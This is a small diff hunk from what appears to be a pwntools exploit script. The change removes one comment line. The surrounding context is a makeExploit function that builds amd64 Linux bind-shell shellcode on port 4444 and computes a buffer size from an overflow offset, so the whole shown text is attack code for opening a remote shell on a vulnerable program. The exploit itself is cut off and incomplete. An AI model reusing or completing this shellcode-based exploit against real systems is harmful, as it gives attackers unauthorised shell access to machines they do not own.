@@ -41,7 +41,6 @@ def makePattern(offset):
 
 
 def makeExploit(offset, address):
-        # pwnlib.shellcraft.amd64.linux.bindsh
         s = shellcraft.amd64.linux.bindsh(4444, "ipv4")
         shellcode = asm(s)
         buf_size = offset - 16
